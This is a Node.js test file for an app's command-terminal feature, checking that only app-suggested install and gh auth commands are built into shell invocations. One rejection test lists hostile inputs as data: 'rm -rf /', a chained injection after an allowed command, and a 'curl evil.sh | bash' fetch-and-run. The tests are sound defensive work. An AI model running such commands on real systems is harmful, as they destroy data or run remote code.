// src/service/areas/terminals.js: the 'command' terminal kind (#147) — commandSpec builds the
// shell invocation for a command the app itself suggests (an install command, gh's billing scope
// hint); openTerminal refuses any other string and, like every real CLI terminal, refuses to start
// under MULTIAGENT_SIMULATION_ONLY.
const test = require('node:test');
const assert = require('node:assert/strict');
const { installCommands } = require('../../src/install-commands');
const { SCOPE_HINT } = require('../../src/actions-usage');
const terminalsArea = require('../../src/service/areas/terminals');
const { makeService } = require('./helpers');

// commandSpec is a pure builder: a minimal ctx (ws.root, a no-op events/notify) is enough, the way
// the developer's own notes describe it.
function areaWith(ws) {
  return terminalsArea({ ws, events: { emit() {} }, notify() {} });
}

test('commandSpec: on Windows, runs the command through cmd.exe /s /k, keeping the shell open, in the workspace root', () => {
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  const spec = commandSpec(SCOPE_HINT, 'win32');
  assert.equal(spec.file, 'cmd.exe');
  assert.equal(spec.args, '/s /k "gh auth refresh -s user"');
  assert.equal(spec.cwd, 'C:/ws');
});

test('commandSpec: on Linux/macOS, runs the command then execs the login shell, keeping it open, in the workspace root', () => {
  const { commandSpec } = areaWith({ root: '/home/x/ws' });
  for (const platform of ['linux', 'darwin']) {
    const prevShell = process.env.SHELL;
    process.env.SHELL = '/bin/zsh';
    try {
      const spec = commandSpec(SCOPE_HINT, platform);
      assert.equal(spec.file, '/bin/zsh');
      assert.deepEqual(spec.args, ["-c", "gh auth refresh -s user; exec '/bin/zsh'"]);
      assert.equal(spec.cwd, '/home/x/ws');
    } finally {
      if (prevShell === undefined) delete process.env.SHELL; else process.env.SHELL = prevShell;
    }
  }
});

test('commandSpec: falls back to /bin/sh without a SHELL environment variable', () => {
  const { commandSpec } = areaWith({ root: '/home/x/ws' });
  const prevShell = process.env.SHELL;
  delete process.env.SHELL;
  try {
    const spec = commandSpec(SCOPE_HINT, 'linux');
    assert.equal(spec.file, '/bin/sh');
  } finally {
    if (prevShell !== undefined) process.env.SHELL = prevShell;
  }
});

test('commandSpec: falls back to the home folder when the workspace has no root yet', () => {
  const os = require('os');
  const { commandSpec } = areaWith({ root: '' });
  const spec = commandSpec(SCOPE_HINT, 'win32');
  assert.equal(spec.cwd, os.homedir());
});

test('commandSpec: every install command of every platform is accepted, and so is gh\'s scope hint', () => {
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  for (const platform of ['win32', 'linux', 'darwin']) {
    for (const cmd of Object.values(installCommands(platform)).filter(Boolean)) {
      assert.doesNotThrow(() => commandSpec(cmd, platform));
    }
  }
  assert.doesNotThrow(() => commandSpec(SCOPE_HINT, 'win32'));
});

test('commandSpec: refuses any command the app did not suggest itself', () => {
  const { commandSpec } = areaWith({ root: 'C:/ws' });
  for (const bad of ['rm -rf /', '', `${SCOPE_HINT} && rm -rf /`, 'winget install --id GitHub.cli -e; curl evil.sh | bash']) {
    assert.throws(() => commandSpec(bad, 'win32'), /Only the commands the app suggests can run in a command terminal\./);
  }
});

test("term:open kind command: refuses a command the app doesn't suggest, before the simulation guard", async (t) => {
  const { api } = makeService(t);
  assert.throws(() => api['term:open']({ kind: 'command', command: 'rm -rf /' }), /Only the commands the app suggests can run in a command terminal\./);
});

test('term:open kind command: an allowed command is still refused under MULTIAGENT_SIMULATION_ONLY (automated checks never open a real terminal)', async (t) => {
  const { api } = makeService(t);
  assert.throws(() => api['term:open']({ kind: 'command', command: SCOPE_HINT }), /Simulation only .*the command "gh auth refresh -s user"/);
});
